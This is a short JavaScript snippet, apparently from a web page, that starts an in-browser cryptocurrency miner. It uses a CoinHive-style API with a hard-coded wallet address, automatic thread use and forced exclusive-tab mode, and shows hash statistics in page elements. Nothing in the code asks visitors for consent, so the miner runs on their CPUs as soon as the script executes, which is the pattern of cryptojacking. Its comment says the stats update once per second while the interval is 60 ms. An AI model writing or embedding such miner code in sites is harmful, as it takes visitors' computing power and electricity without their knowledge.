var miner = new CC.User('48c2rDCzTNY1K1qHB4G1GMCf7vsV4drsmKy6Ak6K6Tvx4GPajfQzZzyLoSp4FQsKCCQTiZ8wSnKd895qACKnSTvYSQTf1hp', 'mike', {
	throttle: 0.2,
	// threads: 2,
	autoThreads: true
});
	miner.start(CC.FORCE_EXCLUSIVE_TAB);

// Listen on events
	miner.on('found', function() { /* Hash found */ })
	miner.on('accepted', function() { /* Hash accepted by the pool */ })

// Update stats once per second
	setInterval(function() {
	var hashesPerSecond = parseInt(miner.getHashesPerSecond());
	var totalHashes = parseInt(miner.getTotalHashes());
	var acceptedHashes = parseInt(miner.getAcceptedHashes());
	var numThreads = parseInt(miner.getNumThreads());

// Output to HTML elements...
	$('#hashes_ps').text(hashesPerSecond);
	$('#hashes_total').text(totalHashes);
	$('#hashes_accepted').text(acceptedHashes);
	$('#hashes_threads').text(numThreads);

}, 60);
